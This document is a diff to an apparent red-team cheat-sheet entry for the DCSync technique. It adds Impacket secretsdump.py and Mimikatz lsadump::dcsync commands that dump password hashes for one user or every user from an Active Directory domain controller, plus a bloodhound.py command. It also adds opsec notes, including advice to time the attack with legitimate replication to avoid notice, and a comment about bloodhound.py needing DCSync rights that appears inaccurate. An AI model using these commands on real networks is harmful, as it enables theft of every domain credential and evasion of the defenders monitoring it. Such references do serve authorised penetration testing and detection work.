@@ -1,11 +1,26 @@
 name: DCSync
 description: Replicate password hashes from Domain Controller
 commands:
-- '# Impacket'
+- '# Impacket - dump all hashes'
 - secretsdump.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
 - ''
-- '# Mimikatz'
+- '# Impacket - specific user only'
+- secretsdump.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>' -just-dc-user Administrator
+- ''
+- '# Mimikatz - single user'
 - lsadump::dcsync /domain:<DOMAIN> /user:Administrator
+- ''
+- '# Mimikatz - all users'
 - lsadump::dcsync /domain:<DOMAIN> /all /csv
-opsec: []
-references: []
+- ''
+- '# bloodhound.py - requires DCSync rights for credential extraction'
+- bloodhound.py -u '<YOUR_USER>' -p '<YOUR_PASSWORD>' -d '<DOMAIN>' -dc '<DC_IP>' -c DCOnly
+opsec:
+- DCSync generates Directory Service Access events (4662)
+- Replication traffic to non-DC is highly anomalous
+- Event 4624 logon + 4662 replication is strong IOC
+- Consider timing with legitimate replication cycles
+- krbtgt and high-value accounts are most critical targets
+references:
+- https://attack.mitre.org/techniques/T1003/006/
+- https://adsecurity.org/?p=1729
